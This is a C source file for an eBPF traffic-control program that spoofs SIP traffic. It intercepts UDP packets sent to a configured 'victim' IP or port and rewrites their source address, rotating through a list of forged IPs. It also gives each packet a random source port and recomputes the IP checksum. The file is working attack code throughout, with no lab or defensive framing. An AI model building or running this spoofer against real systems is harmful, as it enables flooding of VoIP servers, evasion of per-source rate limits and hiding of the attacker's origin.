/*
 * eBPF SIP Packet Spoofer
 * 
 * This eBPF program performs high-performance SIP packet spoofing by intercepting
 * UDP packets and modifying their source IP addresses and ports in kernel space.
 * It provides much better performance than userspace netfilterqueue approach.
 */

#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/in.h>
#include <linux/pkt_cls.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

#define MAX_SPOOFED_IPS 256
#define EPHEMERAL_PORT_MIN 49152
#define EPHEMERAL_PORT_MAX 65535

/* Configuration structure */
struct spoof_config {
    __u32 victim_ip;        /* Target IP address (network byte order) */
    __u16 victim_port;      /* Target port (network byte order) */
    __u16 attacker_port;    /* Source port filter (network byte order) */
    __u32 num_spoofed_ips;  /* Number of IPs in spoofed_ips array */
    __u32 next_ip_index;    /* Round-robin index for IP selection */
    __u32 random_seed;      /* Seed for random port generation */
    __u8 enabled;           /* Enable/disable spoofing */
};

/* Maps for configuration and spoofed IP addresses */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, struct spoof_config);
} config_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, MAX_SPOOFED_IPS);
    __type(key, __u32);
    __type(value, __u32);  /* IP addresses in network byte order */
} spoofed_ips_map SEC(".maps");

/* Simple linear congruential generator for random ports */
static __always_inline __u32 simple_random(__u32 *seed) {
    *seed = (*seed * 1103515245 + 12345) & 0x7fffffff;
    return *seed;
}

/* Calculate IP checksum */
static __always_inline __u16 ip_checksum(struct iphdr *iph) {
    __u32 sum = 0;
    __u16 *ptr = (__u16 *)iph;
    int len = sizeof(struct iphdr) / 2;

    /* Clear checksum field */
    iph->check = 0;

    /* Sum all 16-bit words */
    for (int i = 0; i < len; i++) {
        sum += bpf_ntohs(ptr[i]);
    }

    /* Add carry */
    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);

    /* One's complement */
    return bpf_htons(~sum);
}

/* Calculate UDP checksum (simplified - set to 0 for now) */
static __always_inline __u16 udp_checksum(struct iphdr *iph, struct udphdr *udph) {
    /* For now, just return 0 (valid for UDP) */
    /* In production, we should calculate proper UDP checksum */
    return 0;
}

/* Main eBPF program for packet spoofing */
SEC("tc")
int sip_spoofer(struct __sk_buff *skb) {
    void *data = (void *)(long)skb->data;
    void *data_end = (void *)(long)skb->data_end;
    
    /* Parse Ethernet header */
    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return TC_ACT_OK;

    /* Only process IP packets */
    if (eth->h_proto != bpf_htons(ETH_P_IP))
        return TC_ACT_OK;

    /* Parse IP header */
    struct iphdr *iph = (struct iphdr *)(eth + 1);
    if ((void *)(iph + 1) > data_end)
        return TC_ACT_OK;

    /* Only process UDP packets */
    if (iph->protocol != IPPROTO_UDP)
        return TC_ACT_OK;

    /* Parse UDP header */
    struct udphdr *udph = (struct udphdr *)((void *)iph + (iph->ihl * 4));
    if ((void *)(udph + 1) > data_end)
        return TC_ACT_OK;

    /* Get configuration */
    __u32 config_key = 0;
    struct spoof_config *config = bpf_map_lookup_elem(&config_map, &config_key);
    if (!config || !config->enabled)
        return TC_ACT_OK;

    /* Check if this packet matches our spoofing criteria */
    int should_spoof = 0;
    
    /* Check destination IP */
    if (config->victim_ip != 0 && iph->daddr == config->victim_ip)
        should_spoof = 1;
    
    /* Check destination port */
    if (config->victim_port != 0 && udph->dest == config->victim_port)
        should_spoof = 1;
    
    /* Check source port filter */
    if (config->attacker_port != 0 && udph->source != config->attacker_port)
        should_spoof = 0;

    if (!should_spoof)
        return TC_ACT_OK;

    /* Get next spoofed IP using round-robin */
    if (config->num_spoofed_ips == 0)
        return TC_ACT_OK;

    __u32 ip_index = config->next_ip_index % config->num_spoofed_ips;
    __u32 *spoofed_ip = bpf_map_lookup_elem(&spoofed_ips_map, &ip_index);
    if (!spoofed_ip)
        return TC_ACT_OK;

    /* Update round-robin index (note: this is not atomic, but good enough for our use case) */
    config->next_ip_index = (config->next_ip_index + 1) % config->num_spoofed_ips;

    /* Generate random ephemeral port */
    __u32 random_val = simple_random(&config->random_seed);
    __u16 new_sport = EPHEMERAL_PORT_MIN + (random_val % (EPHEMERAL_PORT_MAX - EPHEMERAL_PORT_MIN + 1));

    /* Modify the packet */
    iph->saddr = *spoofed_ip;
    udph->source = bpf_htons(new_sport);

    /* Recalculate checksums */
    iph->check = ip_checksum(iph);
    udph->check = udp_checksum(iph, udph);

    return TC_ACT_OK;
}

char _license[] SEC("license") = "GPL";
